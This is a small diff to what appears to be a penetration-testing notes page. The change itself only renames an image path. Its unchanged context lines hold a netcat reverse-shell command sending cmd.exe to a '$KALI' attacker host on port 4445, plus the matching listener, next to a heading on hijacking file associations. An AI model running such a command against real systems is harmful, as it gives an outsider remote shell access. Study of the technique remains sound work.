@@ -238,7 +238,7 @@ Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe $KALI 4445"
 nc -lvp 4445
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (2) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Hijacking File Associations
 
